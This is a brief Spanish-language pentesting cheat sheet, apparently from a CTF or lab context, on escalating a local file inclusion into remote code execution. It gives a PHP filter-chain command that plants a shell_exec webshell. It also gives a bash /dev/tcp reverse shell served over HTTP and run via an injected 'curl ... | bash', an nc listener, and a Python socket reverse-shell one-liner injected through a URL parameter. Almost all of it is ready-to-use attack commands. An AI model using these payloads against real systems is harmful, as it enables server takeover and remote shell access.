## Despues de confirmar el payload:

Vamos a utilizar wrappers en este LFI para podernos hacer un parametro llamado CMD y asi poder ejecutar comando para obtener una shell.

```bash
$ python3 php_filter_chain_generator.py --chain '<?php echo shell_exec($_GET["cmd"]);?>'
```

Resultado = CONTENT_GENERATE

```bash
URL = http://<IP>/?cmd=ls -la&page=<CONTENT_GENERATE>
```

Confirmando hay de varias maneras

## Insertando archivo

```bash
URL = http://<IP>/index.php?cmd=ls -la&PAYLOAD=<CONTENT_GENERATE>
```

```bash
nano index.html

#Contenido del nano

#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Donde tengamos el archivo:

```bash
python3 -m http.server 80

nc -nlvp <PORT>
```

Ejecutar con curl

```bash
URL = http://<IP>/index.php?cmd=curl http://<IP_HOST>/ | bash&PAYLOAD=<CONTENT_GENERATE>
```

## O rev shell con python

```bash
URL = http://<IP>/?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'&page=<CONTENT_GENERATE>
```
